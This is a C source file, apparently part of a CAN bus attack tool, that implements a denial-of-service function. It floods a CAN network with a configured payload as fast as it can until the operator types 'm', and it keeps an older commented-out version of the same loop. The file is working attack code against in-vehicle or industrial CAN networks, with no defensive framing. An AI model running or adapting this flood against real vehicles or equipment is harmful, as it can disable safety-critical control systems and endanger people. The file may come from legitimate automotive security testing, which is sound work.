#include "all_headers.h"

/*================================================================
dos.c
This function performs the Denial of Service (DoS) attack

functions:
- dos_dos: send packets as fast as possible

==================================================================*/

// void dos_dos(int socket, struct sockaddr_can *addr, int canid, int time_diff){
//     do {
//         send_can_packet(socket, addr, dos.payload1, dos.payload1_len, canid);
//         if (time_diff == 0) break;
//     } while (1);
// }

// void dos_dos_sending(int socket, struct sockaddr_can *addr, int canid){
//     send_can_packet(socket, addr, dos.payload1, dos.payload1_len, canid);
// }

void dos_dos(int socket, struct sockaddr_can *addr, int canid, int time_diff){
    fd_set readfds;
    int ret;
    char buf[64];
    set_nonblocking(STDIN_FILENO);
    struct timeval timeout = {0, 0};

    do {
        send_can_packet(socket, addr, dos.payload1, dos.payload1_len, canid);
        FD_ZERO(&readfds);
        FD_SET(STDIN_FILENO, &readfds);
        ret = select(STDIN_FILENO + 1, &readfds, NULL, NULL, &timeout);

        if (time_diff == 0) break;
        if (ret == -1) {
            perror("select fail");
            break;
        } else if (ret == 0) {
            send_can_packet(socket, addr, dos.payload1, dos.payload1_len, canid);
        } else {
            if (FD_ISSET(STDIN_FILENO, &readfds)) {
                memset(buf, 0, sizeof(buf));
                if (read(STDIN_FILENO, buf, sizeof(buf)) > 0) {
                    if (buf[0] == 'm') {
                        printf(RED_TEXT"====================='m' detected=======================\n");
                        printf(RESET_COLOR"\n");
                        break;
                    }
                }
            }
        }
    } while (1);
}
